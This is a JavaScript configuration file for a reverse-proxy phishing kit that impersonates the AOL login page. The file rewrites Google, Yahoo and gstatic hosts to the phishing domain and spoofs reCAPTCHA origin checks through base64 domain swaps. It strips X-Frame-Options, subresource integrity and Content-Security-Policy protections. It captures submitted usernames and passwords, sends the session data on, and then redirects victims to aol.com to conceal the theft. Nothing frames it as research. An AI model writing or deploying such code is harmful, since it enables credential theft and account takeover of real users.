/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/recaptcha')) {
            return this.browserReq.pipe(this.proxyEndpoint)
        }
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint)
        this.regexes = [
            {
                reg: /https:\/\/www.google.com\/recaptcha\/enterprise\/anchor?ar=1&amp;k=6LfpJvIaAAAAABzKm7BfQiloQLaQXjjKn9fctiWd&amp;co=aHR0cHM6Ly9zcXVhcmV1cC5jb206NDQz/igm, // Google chrome on windows fix
                replacement: 'https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6LfpJvIaAAAAABzKm7BfQiloQLaQXjjKn9fctiWd&amp;co=aHR0cHM6Ly9zb2xvMXNvbG8yc29sbzMuZHVja2Rucy5vcmc6NDQz'
            },
            {
                reg: /www\.google\.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /login\.yahoo\.net/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /www.gstatic.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /integrity/,
                replacement:'xintegrity'
            },
            {
                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/,
                replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
            }
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }


        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url
            const checkUrls = ["https://guce.yahoo.com", "https://www.aol.com/?guccounter=1&guce_referrer=", "https://www.aol.com/", "/account/comm-channel/refresh"]
            
            for (let exitUrl of checkUrls) {
                if (rLocation.startsWith(exitUrl)) {
                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
                }
            }           
        }

        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }


}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

               
        this.req.headers['origin'] = `https://${clientContext.currentDomain}`
        this.req.headers['referer'] = `https://${clientContext.currentDomain}`


        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
            const hostnameBase64Key = hostnameKey.toString('base64');
            console.log(hostnameBase64Key)

            this.req.url = this.req.url.replace('..', '==')
            this.req.url = this.req.url.replace('.&', '=&')

            
            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')

            
            console.log(this.req.url)
            return super.superExecuteProxy('www.google.com', clientContext)


        }


        if (this.req.url.startsWith('/recaptcha/enterprise')) {
            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''


            console.log(JSON.stringify(this.req.headers))
            
            return super.superExecuteProxy('www.google.com', clientContext)

        }

       

        if (this.req.url.startsWith('/recaptcha/releases')) {
            return super.superExecuteProxy('www.gstatic.com', clientContext)

        }

        if (this.req.method === 'POST') {
            super.uploadRequestBody(clientContext.currentDomain, clientContext)
            clientContext.setLogAvailable(true);
            // super.captureBody(clientContext.currentDomain, clientContext)

        }
        if (this.req.url === '/auth/login/finish' || this.req.url === '/account/fb-messenger-linking' 
        || this.req.url.startsWith('/account/upsell/webauth') || this.req.url.startsWith('/account/comm-channel/')) {
            super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: 'https://aol.com'})
            return this.res.end('')
        }


        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(JSON.stringify(redirectToken))
            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')

            } else {
                this.req.url = reqCheck 
            }

            console.log(this.req.url)
            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }



        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'login.aol.com',

    START_PATH: '/',


    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['login.aol.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: ['login.aol.com'],
        },


        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport